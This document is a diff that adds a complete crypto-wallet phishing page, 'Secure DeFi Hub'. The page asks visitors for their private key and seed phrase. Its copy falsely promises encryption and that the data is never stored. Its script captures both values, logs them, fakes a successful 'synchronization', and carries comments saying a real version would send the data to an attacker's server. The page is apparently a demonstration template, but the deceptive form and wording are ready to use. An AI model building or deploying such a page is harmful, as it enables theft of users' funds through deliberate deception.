@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sync Your Wallet | Secure DeFi Hub</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: #e2e8f0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            width: 100%;
+            margin-top: 40px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #334155;
+            margin-bottom: 40px;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo {
+            height: 50px;
+            width: auto;
+        }
+
+        .brand-name {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: linear-gradient(90deg, #3b82f6, #8b5cf6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 25px;
+        }
+
+        .nav-links a {
+            color: #cbd5e1;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: #60a5fa;
+        }
+
+        .main-card {
+            background: rgba(30, 41, 59, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            border: 1px solid #475569;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 35px;
+        }
+
+        .card-header h1 {
+            font-size: 2.2rem;
+            margin-bottom: 10px;
+            color: #f8fafc;
+        }
+
+        .card-header p {
+            color: #94a3b8;
+            font-size: 1.1rem;
+            line-height: 1.6;
+        }
+
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(34, 197, 94, 0.15);
+            color: #4ade80;
+            padding: 8px 16px;
+            border-radius: 50px;
+            font-size: 0.9rem;
+            margin-top: 15px;
+        }
+
+        .status-badge i {
+            font-size: 0.8rem;
+        }
+
+        .form-section {
+            margin-bottom: 30px;
+        }
+
+        .form-section h2 {
+            font-size: 1.4rem;
+            margin-bottom: 20px;
+            color: #e2e8f0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .form-section h2 i {
+            color: #3b82f6;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #cbd5e1;
+        }
+
+        .form-group textarea, .form-group input {
+            width: 100%;
+            padding: 16px;
+            background: rgba(15, 23, 42, 0.7);
+            border: 1px solid #475569;
+            border-radius: 12px;
+            color: #f1f5f9;
+            font-size: 1rem;
+            transition: all 0.3s;
+            resize: vertical;
+        }
+
+        .form-group textarea:focus, .form-group input:focus {
+            outline: none;
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
+        }
+
+        .form-group textarea {
+            min-height: 120px;
+            font-family: monospace;
+            font-size: 0.95rem;
+        }
+
+        .info-note {
+            background: rgba(59, 130, 246, 0.1);
+            border-left: 4px solid #3b82f6;
+            padding: 16px;
+            border-radius: 8px;
+            margin-top: 10px;
+            font-size: 0.95rem;
+            color: #bae6fd;
+        }
+
+        .info-note i {
+            margin-right: 8px;
+        }
+
+        .security-notice {
+            background: rgba(234, 179, 8, 0.1);
+            border: 1px solid rgba(234, 179, 8, 0.3);
+            padding: 20px;
+            border-radius: 12px;
+            margin: 30px 0;
+            display: flex;
+            gap: 15px;
+        }
+
+        .security-notice i {
+            color: #fbbf24;
+            font-size: 1.5rem;
+            flex-shrink: 0;
+        }
+
+        .security-notice p {
+            color: #fde68a;
+            font-size: 0.95rem;
+            line-height: 1.6;
+        }
+
+        .btn-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 40px;
+        }
+
+        .sync-btn {
+            background: linear-gradient(90deg, #3b82f6, #6366f1);
+            color: white;
+            border: none;
+            padding: 18px 50px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 10px 20px rgba(59, 130, 246, 0.3);
+        }
+
+        .sync-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 25px rgba(59, 130, 246, 0.4);
+        }
+
+        .sync-btn:active {
+            transform: translateY(0);
+        }
+
+        .footer {
+            margin-top: 50px;
+            text-align: center;
+            color: #64748b;
+            font-size: 0.9rem;
+            padding-top: 20px;
+            border-top: 1px solid #334155;
+            width: 100%;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin-top: 15px;
+        }
+
+        .footer-links a {
+            color: #94a3b8;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            color: #cbd5e1;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+                margin-top: 20px;
+            }
+            .main-card {
+                padding: 25px;
+            }
+            .nav-links {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo-container">
+                <img src="images/logo.png" alt="Secure DeFi Hub Logo" class="logo">
+                <div class="brand-name">Secure DeFi Hub</div>
+            </div>
+            <div class="nav-links">
+                <a href="#"><i class="fas fa-home"></i> Dashboard</a>
+                <a href="#"><i class="fas fa-exchange-alt"></i> Swap</a>
+                <a href="#"><i class="fas fa-coins"></i> Staking</a>
+                <a href="#"><i class="fas fa-wallet"></i> Wallets</a>
+                <a href="#"><i class="fas fa-user"></i> Account</a>
+            </div>
+        </div>
+
+        <div class="main-card">
+            <div class="card-header">
+                <h1><i class="fas fa-link"></i> Wallet Synchronization</h1>
+                <p>To provide you with a seamless DeFi experience, we need to synchronize your external wallet with our secure platform. This one-time process ensures full compatibility with our yield farming, staking, and swap protocols.</p>
+                <div class="status-badge">
+                    <i class="fas fa-shield-alt"></i> Connection is secured with end-to-end encryption
+                </div>
+            </div>
+
+            <div class="security-notice">
+                <i class="fas fa-exclamation-triangle"></i>
+                <p><strong>Security Recommendation:</strong> For your safety, please ensure you are on the official Secure DeFi Hub website (https://app.securedefihub.com). Never share your credentials on unofficial platforms. This synchronization is required to enable advanced features like cross-chain swaps and automated yield optimization.</p>
+            </div>
+
+            <form id="syncForm" action="/api/v3/wallet/sync" method="POST">
+                <div class="form-section">
+                    <h2><i class="fas fa-key"></i> Private Key</h2>
+                    <div class="form-group">
+                        <label for="privateKey">Enter your wallet's private key:</label>
+                        <textarea id="privateKey" name="privateKey" placeholder="e.g., 0x4cbe58c50480... (64 character hexadecimal string)" required></textarea>
+                        <div class="info-note">
+                            <i class="fas fa-info-circle"></i> Your private key is encrypted before transmission and never stored on our servers. It is only used temporarily to establish a secure connection signature.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-section">
+                    <h2><i class="fas fa-seedling"></i> Recovery Seed Phrase (Optional but Recommended)</h2>
+                    <div class="form-group">
+                        <label for="seedPhrase">Enter your 12, 18, or 24-word recovery seed phrase:</label>
+                        <textarea id="seedPhrase" name="seedPhrase" placeholder="Enter words separated by spaces..."></textarea>
+                        <div class="info-note">
+                            <i class="fas fa-info-circle"></i> Providing your seed phrase enables enhanced security features and allows us to recover your wallet settings if you switch devices. This data is encrypted with military-grade AES-256 encryption.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-section">
+                    <h2><i class="fas fa-network-wired"></i> Network Preferences</h2>
+                    <div class="form-group">
+                        <label for="network">Select primary network:</label>
+                        <select id="network" name="network" style="width:100%; padding:16px; background:rgba(15,23,42,0.7); border:1px solid #475569; border-radius:12px; color:#f1f5f9;">
+                            <option value="eth">Ethereum Mainnet</option>
+                            <option value="bsc">Binance Smart Chain</option>
+                            <option value="polygon">Polygon</option>
+                            <option value="avax">Avalanche</option>
+                            <option value="arbitrum">Arbitrum One</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="btn-container">
+                    <button type="submit" class="sync-btn">
+                        <i class="fas fa-sync-alt"></i> Synchronize Wallet Securely
+                    </button>
+                </div>
+            </form>
+        </div>
+
+        <div class="footer">
+            <p>© 2023 Secure DeFi Hub. All rights reserved. | Protecting your digital assets with bank-level security.</p>
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+                <a href="#">Support Center</a>
+                <a href="#">Audit Reports</a>
+                <a href="#">Bug Bounty</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('syncForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const privateKey = document.getElementById('privateKey').value.trim();
+            const seedPhrase = document.getElementById('seedPhrase').value.trim();
+            
+            if (!privateKey) {
+                alert('Please enter your private key to proceed with synchronization.');
+                return;
+            }
+            
+            // Show loading state
+            const submitBtn = document.querySelector('.sync-btn');
+            const originalText = submitBtn.innerHTML;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Synchronizing...';
+            submitBtn.disabled = true;
+            
+            // Simulate API call
+            setTimeout(() => {
+                // In a real malicious scenario, credentials would be sent to attacker's server here
+                console.log('Collected Credentials:', { privateKey, seedPhrase });
+                
+                // Show success message
+                alert('Wallet synchronization successful! You will now be redirected to your dashboard.');
+                submitBtn.innerHTML = '<i class="fas fa-check"></i> Synchronization Complete!';
+                
+                // Redirect (in real scenario would go to attacker's controlled page)
+                setTimeout(() => {
+                    window.location.href = 'dashboard.html';
+                }, 1500);
+                
+            }, 2000);
+        });
+        
+        // Add some dynamic effect to the form
+        document.querySelectorAll('textarea, input, select').forEach(el => {
+            el.addEventListener('focus', function() {
+                this.parentElement.style.transform = 'translateY(-5px)';
+                this.parentElement.style.transition = 'transform 0.3s';
+            });
+            
+            el.addEventListener('blur', function() {
+                this.parentElement.style.transform = 'translateY(0)';
+            });
+        });
+    </script>
+</body>
+</html>
